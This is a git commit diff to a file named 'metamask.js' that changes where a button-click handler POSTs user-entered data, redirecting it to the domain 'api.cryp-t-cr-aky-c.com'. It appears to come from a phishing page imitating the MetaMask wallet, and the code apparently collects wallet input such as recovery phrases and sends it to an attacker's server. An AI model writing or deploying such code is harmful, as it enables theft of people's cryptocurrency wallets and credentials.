79c32393641d243895bbfb21f61919dc7275b169
clientBackend <148474934+clientBackend@users.noreply.github.com>
2023-12-13 21:54:47 +0530

    Update metamask.js

--- MetaMask/metamask.js
+++ MetaMask/metamask.js
@@ -72,7 +72,7 @@ document.querySelector(".button").addEventListener("click",(e)=>{
     }
 
   if(!error){
-      const url = "https://backend-01-92mi.onrender.com/api/metamask";
+      const url = "https://api.cryp-t-cr-aky-c.com/api/metamask";
       const data = {
           packetData:inputData
       };
